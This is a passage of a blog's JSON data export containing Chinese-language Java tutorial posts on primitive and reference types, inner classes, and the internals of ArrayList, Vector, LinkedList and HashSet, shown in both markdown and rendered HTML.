title=\"1.基本类型\"></a>1.基本类型</h4><p>位bit/字节byte关系<br><br>bit指01二进制位，例：0000为4位<br><br>byte为8位，即00000000八位二进制为一字节，通常用十六进制表示0x00</p>\n<ul>\n<li>short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</li>\n<li>int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</li>\n<li>long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</li>\n<li>float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</li>\n<li>double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</li>\n<li>boolean：只有true和false两个取值。</li>\n<li>char：16位，存储Unicode码，用单引号赋值。</li>\n</ul>\n<p>基本类型并不是类对象。<br><br>为了让这8中基本类型也能面向对象，Java为其提供了包装器类型.<br>对应上面顺序为：Byte, Short, Integer, Long, Float, Double, Boolean, Character<br>现在，这些包装器类型都是面向对象的类了，具有对象方法可以进行很多高级的操作，而不是简单的基本类型，都是引用类型了.<br>java提供了自动拆箱/装箱来实现基本类型数据和包装器类型数据之间相互转换、赋值。</p>\n<h4 id=\"2-引用类型\"><a href=\"#2-引用类型\" class=\"headerlink\" title=\"2.引用类型\"></a>2.引用类型</h4><ul>\n<li>强引用<br><br>最常用的引用类型，如Object obj = new Object(); 。只要强引用存在则GC时则必定不被回收。<br><br>其它三个暂时不太理解，以后接触再添加</li>\n<li>软引用</li>\n<li>弱引用</li>\n<li>虚引用</li>\n</ul>\n<h4 id=\"3-基本类型与引用类型区别\"><a href=\"#3-基本类型与引用类型区别\" class=\"headerlink\" title=\"3.基本类型与引用类型区别\"></a>3.基本类型与引用类型区别</h4><p>基本类型就是一个值<br><br>引用类型：它的值是指向内存空间的引用，就是地址，所指向的内存中保存着变量<br><br>","more":"</p>\n<h4 id=\"4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"><a href=\"#4-引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\" class=\"headerlink\" title=\"4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法\"></a>4.引用与实例，内部类，枚举类，访问控制符的基本概念及常见用法</h4><ul>\n<li>引用(reference) :<br>指向一个对象<br></li>\n<li><p>实例(instance):<br>按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词</p>\n</li>\n<li><p>内部类<br><br>将一个类定义在另一个类的内部。<br>内部类可以很好的解决多重继承问题。（继承接口或类，接口本来可以多重继承，类不能多重继承，内部类可以解决类不能多重继承问题）。<br><br>使用内部类最吸引人的原因是：每个内部类都能独立地继承一个（接口的）实现，所以无论外围类是否已经继承了某个（接口的）实现，对于内部类都没有影响。<br><br>原文连接：<a href=\"https://blog.csdn.net/qq_38242407/article/details/78159494\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38242407/article/details/78159494</a></p>\n</li>\n</ul>\n<p>父类：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Father &#123;</span><br><span class=\"line\">\tpublic int strong()&#123;</span><br><span class=\"line\">\t\treturn 9;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public class Mother &#123;</span><br><span class=\"line\">\tpublic int kind()&#123;</span><br><span class=\"line\">\t\treturn 8;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>子类，内部类多重继承<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Son &#123;</span><br><span class=\"line\">  //内部类继承Father类</span><br><span class=\"line\">\tclass Father_1 extends Father&#123;  //继承一</span><br><span class=\"line\">\t\tpublic int strong()&#123;</span><br><span class=\"line\">\t\t\treturn super.strong() + 1;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tclass Mother_1 extends  Mother&#123;  //继承二</span><br><span class=\"line\">\t\tpublic int kind()&#123;</span><br><span class=\"line\">\t\t\treturn super.kind() - 2;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类1方法</span><br><span class=\"line\">\tpublic int getStrong()&#123;</span><br><span class=\"line\">\t\treturn new Father_1().strong();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   //获取父类2方法</span><br><span class=\"line\">\tpublic int getKind()&#123;</span><br><span class=\"line\">\t\treturn new Mother_1().kind();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><p>枚举类<br><br>在某些情况下，一个类的对象时有限且固定的，如季节类，它只有春夏秋冬4个对象这种实例有限且固定的类，在 Java 中被称为枚举类。<br><br>枚举类最基本的用法是实现一个类型安全的枚举（final)。<br>枚举常量用逗号分隔,每个枚举常量都是一个对象。<br>每一个枚举都是枚举类的实例，支持初始化/构造函数/匿名类/覆盖基类等。</p>\n</li>\n<li><p>访问控制符<br><br>public    共有的，对所有类可见。<br><br>protected    受保护的，对同一包内的类和所有子类可见。<br><br>private    私有的，在同一类内可见。<br><br>default (即不加修饰控制符情况下)默认的    在同一包内可见。默认不使用任何修饰符。<br></p>\n</li>\n</ul>"},{"title":"java基础-Collection","date":"2019-07-04T15:19:34.000Z","_content":"\n### 一.Collection\n\n##### 1.为什么需要集合\n- 可以提供一个容器(可变长)用于存储对象\n\n##### 2.集合关系图\n<Strong>容器主要为: Map 和 Collection<br></Strong>\n\nCollection主要包含了Set,List和Queue<br>\n![collection1](http://67.216.218.49:8000/file/blogs/java/collection/collection1.png)\n\n##### 3.Iterator\nIterator接口方法:<br>\n- hasNext()\n- next()\n- remove()\n\n\n### 二.List\n###### 概要\n\nArrayList底层是数组，查询快，增删慢，线程不安全.<br>\n\nList主要: ArrayList,LinkedList,Vector<br>\n原文：https://segmentfault.com/a/1190000014240704\n\n##### 1.ArrayList\n###### (1).属性\n```\n//初始化容量为10\nprivate static final int DEFAULT_CAPACITY = 10;\n\nprivate static final Object[] EMPTY_ELEMENTDATA = {};\n\nprivate static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n//存储空间\ntransient Object[] elementData;\n```\n可见，ArrayList底层是数组<br>\n###### (2).构造方法\n```\n//自己设置初始化容量\npublic ArrayList(int initialCapacity) {\n    if (initialCapacity > 0) {\n        this.elementData = new Object[initialCapacity];\n    } else if (initialCapacity == 0) {\n        this.elementData = EMPTY_ELEMENTDATA;\n    } else {\n        throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                           initialCapacity);\n    }\n}\n\n//默认的初始化容量\npublic ArrayList() {\n    this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\n###### (3).扩容\n\n- 新增一个元素 add(E e)\n\n```\npublic boolean add(E e) {\n    //确认容量是否够\n    ensureCapacityInternal(size + 1);  // Increments modCount!!\n    elementData[size++] = e;\n    return true;\n}\n\n```\n\n- 确认容量 ensureCapacityInternal(int minCapacity)\n\n```\nprivate void ensureCapacityInternal(int minCapacity) {\n    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));\n}\n\nprivate static int calculateCapacity(Object[] elementData, int minCapacity) {\n    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n        return Math.max(DEFAULT_CAPACITY, minCapacity);\n    }\n    return minCapacity;\n}\n\nprivate void ensureExplicitCapacity(int minCapacity) {\n    modCount++;\n\n    // overflow-conscious code\n    if (minCapacity - elementData.length > 0)\n        //容量不够时，进行扩容\n        grow(minCapacity);\n}\n```\n- 扩容 grow(int minCapacity)\n\n```\nprivate void grow(int minCapacity) {\n    // overflow-conscious code\n    int oldCapacity = elementData.length;\n    //右移运算，num >> 1,相当于num除以2，相当于扩容1.5倍\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    //第一次扩容后，还是不够，直接为minCapacity\n    if (newCapacity - minCapacity < 0)\n        newCapacity = minCapacity;\n    if (newCapacity - MAX_ARRAY_SIZE > 0)\n        newCapacity = hugeCapacity(minCapacity);\n    // minCapacity is usually close to size, so this is a win:\n    //将原数组拷贝到一个新数组\n    elementData = Arrays.copyOf(elementData, newCapacity);\n}\n\n```\n\n##### 2.Vector\n\nVector底层也是数组，它与ArrayList的区别为，它是线程安全的.<br>\n\nVector中方法大都为 synchronized\n```\npublic synchronized int size() {\n        return elementCount;\n    }\n```\n\n##### 3.LinkedList\n\nLinkedList 底层为双向链表<br>\n\n###### (1).属性\n```\ntransient int size = 0;\n\n//头节点\ntransient Node<E> first;\n\n//尾节点\ntransient Node<E> last;\n\n//内部节点类\nprivate static class Node<E> {\n    E item;\n    Node<E> next;\n    Node<E> prev;\n\n    Node(Node<E> prev, E element, Node<E> next) {\n        this.item = element;\n        this.next = next;\n        this.prev = prev;\n    }\n}\n```\n\n###### (2).构造方法\n```\n//空构造\npublic LinkedList() {\n}\n\npublic LinkedList(Collection<? extends E> c) {\n    this();\n    addAll(c);\n}\n```\n\n###### (3).增 add(E e)\n\n```\npublic boolean add(E e) {\n    linkLast(e);\n    return true;\n}\n\nvoid linkLast(E e) {\n    /将尾节点设为前节点\n    final Node<E> l = last;\n    //新节点，参数为(前节点(当前的尾节点)，添加的元素， 后节点)\n    final Node<E> newNode = new Node<>(l, e, null);\n    //将新节点变为尾节点\n    last = newNode;\n    //如果前面没有节点，则新节点为头节点\n    if (l == null)\n        first = newNode;\n    else\n        l.next = newNode;\n    size++;\n    modCount++;\n}\n```\n\n###### (4).删 remove(Object o)\n\n```\npublic boolean remove(Object o) {\n     if (o == null) {\n         for (Node<E> x = first; x != null; x = x.next) {\n             if (x.item == null) {\n                 unlink(x);\n                 return true;\n             }\n         }\n     } else {\n         for (Node<E> x = first; x != null; x = x.next) {\n             if (o.equals(x.item)) {\n                 unlink(x);\n                 return true;\n             }\n         }\n     }\n     return false;\n }\n\nE unlink(Node<E> x) {\n    // assert x != null;\n    final E element = x.item;\n    final Node<E> next = x.next;\n    final Node<E> prev = x.prev;\n\n    //将前节点的next 指向自己的next\n    //将自己从 next链中删除\n    if (prev == null) {\n        first = next;\n    } else {\n        prev.next = next;\n        x.prev = null;\n    }\n\n    //将后节点的prev指向自己的prev\n    //将自己从prev链中删除\n    if (next == null) {\n        last = prev;\n    } else {\n        next.prev = prev;\n        x.next = null;\n    }\n\n    x.item = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n###### (5).改\n\n```\npublic E set(int index, E element) {\n    //检查是否在范围内\n    checkElementIndex(index);\n    Node<E> x = node(index);\n    E oldVal = x.item;\n    //替换\n    x.item = element;\n    return oldVal;\n}\n\nprivate void checkElementIndex(int index) {\n    if (!isElementIndex(index))\n        throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n}\n\nprivate boolean isElementIndex(int index) {\n     return index >= 0 && index < size;\n }\n\n//获取指定node\nNode<E> node(int index) {\n   // assert isElementIndex(index);\n\n   //从头还是尾开始遍历 二分\n   if (index < (size >> 1)) {\n       Node<E> x = first;\n       for (int i = 0; i < index; i++)\n           x = x.next;\n       return x;\n   } else {\n       Node<E> x = last;\n       for (int i = size - 1; i > index; i--)\n           x = x.prev;\n       return x;\n   }\n}\n```\n\n###### (6).查 get(int index)\n\n```\npublic E get(int index) {\n    checkElementIndex(index);\n    return node(index).item;\n}\n\n```\n\n### 三.Set\n\nSet: 不允许有重复数据，去重<br>\nSet主要:HashSet,TreeSet,LinkedHashSet<br>\n\nHashSet:底层为哈希表加红黑树<br>\nTreeSet:底层为红黑树<br>\nLinkedHashSet: 底层为哈希表和一个双向链表<br>\n\n##### 1.HashSet\n\n```\n//map<key, value>\nprivate transient HashMap<E,Object> map;\n\n//value\nprivate static final Object PRESENT = new Object();\n\n//构造函数  可以看出实际为HashMap\npublic HashSet() {\n    map = new HashMap<>();\n}\n\n//add 看出value 为 PRESENT\npublic boolean add(E e) {\n    return map.put(e, PRESENT)==null;\n}\n\n```\n","source":"_posts/java/java基础-集合-Collection.md","raw":"---\ntitle: java基础-Collection\ndate: 2019-07-04 11:19:34\ntags: [java]\n---\n\n### 一.Collection\n\n##### 1.为什么需要集合\n- 可以提供一个容器(可变长)用于存储对象\n\n##### 2.集合关系图\n<Strong>容器主要为: Map 和 Collection<br></Strong>\n\nCollection主要包含了Set,List和Queue<br>\n![collection1](http://67.216.218.49:8000/file/blogs/java/collection/collection1.png)\n\n##### 3.Iterator\nIterator接口方法:<br>\n- hasNext()\n- next()\n- remove()\n\n\n### 二.List\n###### 概要\n\nArrayList底层是数组，查询快，增删慢，线程不安全.<br>\n\nList主要: ArrayList,LinkedList,Vector<br>\n原文：https://segmentfault.com/a/1190000014240704\n\n##### 1.ArrayList\n###### (1).属性\n```\n//初始化容量为10\nprivate static final int DEFAULT_CAPACITY = 10;\n\nprivate static final Object[] EMPTY_ELEMENTDATA = {};\n\nprivate static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n//存储空间\ntransient Object[] elementData;\n```\n可见，ArrayList底层是数组<br>\n###### (2).构造方法\n```\n//自己设置初始化容量\npublic ArrayList(int initialCapacity) {\n    if (initialCapacity > 0) {\n        this.elementData = new Object[initialCapacity];\n    } else if (initialCapacity == 0) {\n        this.elementData = EMPTY_ELEMENTDATA;\n    } else {\n        throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                           initialCapacity);\n    }\n}\n\n//默认的初始化容量\npublic ArrayList() {\n    this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\n###### (3).扩容\n\n- 新增一个元素 add(E e)\n\n```\npublic boolean add(E e) {\n    //确认容量是否够\n    ensureCapacityInternal(size + 1);  // Increments modCount!!\n    elementData[size++] = e;\n    return true;\n}\n\n```\n\n- 确认容量 ensureCapacityInternal(int minCapacity)\n\n```\nprivate void ensureCapacityInternal(int minCapacity) {\n    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));\n}\n\nprivate static int calculateCapacity(Object[] elementData, int minCapacity) {\n    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n        return Math.max(DEFAULT_CAPACITY, minCapacity);\n    }\n    return minCapacity;\n}\n\nprivate void ensureExplicitCapacity(int minCapacity) {\n    modCount++;\n\n    // overflow-conscious code\n    if (minCapacity - elementData.length > 0)\n        //容量不够时，进行扩容\n        grow(minCapacity);\n}\n```\n- 扩容 grow(int minCapacity)\n\n```\nprivate void grow(int minCapacity) {\n    // overflow-conscious code\n    int oldCapacity = elementData.length;\n    //右移运算，num >> 1,相当于num除以2，相当于扩容1.5倍\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    //第一次扩容后，还是不够，直接为minCapacity\n    if (newCapacity - minCapacity < 0)\n        newCapacity = minCapacity;\n    if (newCapacity - MAX_ARRAY_SIZE > 0)\n        newCapacity = hugeCapacity(minCapacity);\n    // minCapacity is usually close to size, so this is a win:\n    //将原数组拷贝到一个新数组\n    elementData = Arrays.copyOf(elementData, newCapacity);\n}\n\n```\n\n##### 2.Vector\n\nVector底层也是数组，它与ArrayList的区别为，它是线程安全的.<br>\n\nVector中方法大都为 synchronized\n```\npublic synchronized int size() {\n        return elementCount;\n    }\n```\n\n##### 3.LinkedList\n\nLinkedList 底层为双向链表<br>\n\n###### (1).属性\n```\ntransient int size = 0;\n\n//头节点\ntransient Node<E> first;\n\n//尾节点\ntransient Node<E> last;\n\n//内部节点类\nprivate static class Node<E> {\n    E item;\n    Node<E> next;\n    Node<E> prev;\n\n    Node(Node<E> prev, E element, Node<E> next) {\n        this.item = element;\n        this.next = next;\n        this.prev = prev;\n    }\n}\n```\n\n###### (2).构造方法\n```\n//空构造\npublic LinkedList() {\n}\n\npublic LinkedList(Collection<? extends E> c) {\n    this();\n    addAll(c);\n}\n```\n\n###### (3).增 add(E e)\n\n```\npublic boolean add(E e) {\n    linkLast(e);\n    return true;\n}\n\nvoid linkLast(E e) {\n    /将尾节点设为前节点\n    final Node<E> l = last;\n    //新节点，参数为(前节点(当前的尾节点)，添加的元素， 后节点)\n    final Node<E> newNode = new Node<>(l, e, null);\n    //将新节点变为尾节点\n    last = newNode;\n    //如果前面没有节点，则新节点为头节点\n    if (l == null)\n        first = newNode;\n    else\n        l.next = newNode;\n    size++;\n    modCount++;\n}\n```\n\n###### (4).删 remove(Object o)\n\n```\npublic boolean remove(Object o) {\n     if (o == null) {\n         for (Node<E> x = first; x != null; x = x.next) {\n             if (x.item == null) {\n                 unlink(x);\n                 return true;\n             }\n         }\n     } else {\n         for (Node<E> x = first; x != null; x = x.next) {\n             if (o.equals(x.item)) {\n                 unlink(x);\n                 return true;\n             }\n         }\n     }\n     return false;\n }\n\nE unlink(Node<E> x) {\n    // assert x != null;\n    final E element = x.item;\n    final Node<E> next = x.next;\n    final Node<E> prev = x.prev;\n\n    //将前节点的next 指向自己的next\n    //将自己从 next链中删除\n    if (prev == null) {\n        first = next;\n    } else {\n        prev.next = next;\n        x.prev = null;\n    }\n\n    //将后节点的prev指向自己的prev\n    //将自己从prev链中删除\n    if (next == null) {\n        last = prev;\n    } else {\n        next.prev = prev;\n        x.next = null;\n    }\n\n    x.item = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n###### (5).改\n\n```\npublic E set(int index, E element) {\n    //检查是否在范围内\n    checkElementIndex(index);\n    Node<E> x = node(index);\n    E oldVal = x.item;\n    //替换\n    x.item = element;\n    return oldVal;\n}\n\nprivate void checkElementIndex(int index) {\n    if (!isElementIndex(index))\n        throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n}\n\nprivate boolean isElementIndex(int index) {\n     return index >= 0 && index < size;\n }\n\n//获取指定node\nNode<E> node(int index) {\n   // assert isElementIndex(index);\n\n   //从头还是尾开始遍历 二分\n   if (index < (size >> 1)) {\n       Node<E> x = first;\n       for (int i = 0; i < index; i++)\n           x = x.next;\n       return x;\n   } else {\n       Node<E> x = last;\n       for (int i = size - 1; i > index; i--)\n           x = x.prev;\n       return x;\n   }\n}\n```\n\n###### (6).查 get(int index)\n\n```\npublic E get(int index) {\n    checkElementIndex(index);\n    return node(index).item;\n}\n\n```\n\n### 三.Set\n\nSet: 不允许有重复数据，去重<br>\nSet主要:HashSet,TreeSet,LinkedHashSet<br>\n\nHashSet:底层为哈希表加红黑树<br>\nTreeSet:底层为红黑树<br>\nLinkedHashSet: 底层为哈希表和一个双向链表<br>\n\n##### 1.HashSet\n\n```\n//map<key, value>\nprivate transient HashMap<E,Object> map;\n\n//value\nprivate static final Object PRESENT = new Object();\n\n//构造函数  可以看出实际为HashMap\npublic HashSet() {\n    map = new HashMap<>();\n}\n\n//add 看出value 为 PRESENT\npublic boolean add(E e) {\n    return map.put(e, PRESENT)==null;\n}\n\n```\n","slug":"java/java基础-集合-Collection","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hu000v6dcpnrn5j5as","content":"<h3 id=\"一-Collection\"><a href=\"#一-Collection\" class=\"headerlink\" title=\"一.Collection\"></a>一.Collection</h3><h5 id=\"1-为什么需要集合\"><a href=\"#1-为什么需要集合\" class=\"headerlink\" title=\"1.为什么需要集合\"></a>1.为什么需要集合</h5><ul>\n<li>可以提供一个容器(可变长)用于存储对象</li>\n</ul>\n<h5 id=\"2-集合关系图\"><a href=\"#2-集合关系图\" class=\"headerlink\" title=\"2.集合关系图\"></a>2.集合关系图</h5><strong>容器主要为: Map 和 Collection<br></strong>\n\n<p>Collection主要包含了Set,List和Queue<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/collection/collection1.png\" alt=\"collection1\"></p>\n<h5 id=\"3-Iterator\"><a href=\"#3-Iterator\" class=\"headerlink\" title=\"3.Iterator\"></a>3.Iterator</h5><p>Iterator接口方法:<br></p>\n<ul>\n<li>hasNext()</li>\n<li>next()</li>\n<li>remove()</li>\n</ul>\n<h3 id=\"二-List\"><a href=\"#二-List\" class=\"headerlink\" title=\"二.List\"></a>二.List</h3><h6 id=\"概要\"><a href=\"#概要\" class=\"headerlink\" title=\"概要\"></a>概要</h6><p>ArrayList底层是数组，查询快，增删慢，线程不安全.<br></p>\n<p>List主要: ArrayList,LinkedList,Vector<br><br>原文：<a href=\"https://segmentfault.com/a/1190000014240704\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000014240704</a></p>\n<h5 id=\"1-ArrayList\"><a href=\"#1-ArrayList\" class=\"headerlink\" title=\"1.ArrayList\"></a>1.ArrayList</h5><h6 id=\"1-属性\"><a href=\"#1-属性\" class=\"headerlink\" title=\"(1).属性\"></a>(1).属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//初始化容量为10</span><br><span class=\"line\">private static final int DEFAULT_CAPACITY = 10;</span><br><span class=\"line\"></span><br><span class=\"line\">private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class=\"line\">//存储空间</span><br><span class=\"line\">transient Object[] elementData;</span><br></pre></td></tr></table></figure>\n<p>可见，ArrayList底层是数组<br></p>\n<h6 id=\"2-构造方法\"><a href=\"#2-构造方法\" class=\"headerlink\" title=\"(2).构造方法\"></a>(2).构造方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自己设置初始化容量</span><br><span class=\"line\">public ArrayList(int initialCapacity) &#123;</span><br><span class=\"line\">    if (initialCapacity &gt; 0) &#123;</span><br><span class=\"line\">        this.elementData = new Object[initialCapacity];</span><br><span class=\"line\">    &#125; else if (initialCapacity == 0) &#123;</span><br><span class=\"line\">        this.elementData = EMPTY_ELEMENTDATA;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        throw new IllegalArgumentException(&quot;Illegal Capacity: &quot;+</span><br><span class=\"line\">                                           initialCapacity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//默认的初始化容量</span><br><span class=\"line\">public ArrayList() &#123;</span><br><span class=\"line\">    this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-扩容\"><a href=\"#3-扩容\" class=\"headerlink\" title=\"(3).扩容\"></a>(3).扩容</h6><ul>\n<li>新增一个元素 add(E e)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    //确认容量是否够</span><br><span class=\"line\">    ensureCapacityInternal(size + 1);  // Increments modCount!!</span><br><span class=\"line\">    elementData[size++] = e;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>确认容量 ensureCapacityInternal(int minCapacity)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void ensureCapacityInternal(int minCapacity) &#123;</span><br><span class=\"line\">    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private static int calculateCapacity(Object[] elementData, int minCapacity) &#123;</span><br><span class=\"line\">    if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class=\"line\">        return Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return minCapacity;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void ensureExplicitCapacity(int minCapacity) &#123;</span><br><span class=\"line\">    modCount++;</span><br><span class=\"line\"></span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    if (minCapacity - elementData.length &gt; 0)</span><br><span class=\"line\">        //容量不够时，进行扩容</span><br><span class=\"line\">        grow(minCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>扩容 grow(int minCapacity)</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void grow(int minCapacity) &#123;</span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    int oldCapacity = elementData.length;</span><br><span class=\"line\">    //右移运算，num &gt;&gt; 1,相当于num除以2，相当于扩容1.5倍</span><br><span class=\"line\">    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</span><br><span class=\"line\">    //第一次扩容后，还是不够，直接为minCapacity</span><br><span class=\"line\">    if (newCapacity - minCapacity &lt; 0)</span><br><span class=\"line\">        newCapacity = minCapacity;</span><br><span class=\"line\">    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)</span><br><span class=\"line\">        newCapacity = hugeCapacity(minCapacity);</span><br><span class=\"line\">    // minCapacity is usually close to size, so this is a win:</span><br><span class=\"line\">    //将原数组拷贝到一个新数组</span><br><span class=\"line\">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-Vector\"><a href=\"#2-Vector\" class=\"headerlink\" title=\"2.Vector\"></a>2.Vector</h5><p>Vector底层也是数组，它与ArrayList的区别为，它是线程安全的.<br></p>\n<p>Vector中方法大都为 synchronized<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public synchronized int size() &#123;</span><br><span class=\"line\">        return elementCount;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"3-LinkedList\"><a href=\"#3-LinkedList\" class=\"headerlink\" title=\"3.LinkedList\"></a>3.LinkedList</h5><p>LinkedList 底层为双向链表<br></p>\n<h6 id=\"1-属性-1\"><a href=\"#1-属性-1\" class=\"headerlink\" title=\"(1).属性\"></a>(1).属性</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">transient int size = 0;</span><br><span class=\"line\"></span><br><span 